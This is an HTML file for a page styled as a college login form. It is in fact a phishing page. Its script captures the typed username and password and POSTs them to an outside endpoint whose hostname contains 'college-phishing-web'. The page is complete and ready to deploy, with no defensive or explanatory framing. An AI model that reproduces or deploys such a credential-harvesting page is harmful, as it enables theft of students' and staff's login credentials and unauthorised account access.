<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>College Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .login-container {
      background-color: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }

    .logo {
      width: 100px;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="College_logo.png" alt="College Logo" class="logo">
    <h2>Login</h2>
    
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <input type="submit" value="Login">
    </form>

    <p id="output"></p>
  </div>

  <!-- ðŸ”¹ REPLACE this script with fetch() -->
  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault(); // stop page refresh

      let user = document.getElementById("username").value;
      let pass = document.getElementById("password").value;

      try {
        let response = await fetch("https://college-phishing-web.onrender.com", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ username: user, password: pass })
        });

        let result = await response.json();
        document.getElementById("output").innerText = result.message;
      } catch (err) {
        document.getElementById("output").innerText = "Error: " + err.message;
      }
    });
  </script>

</body>
</html>
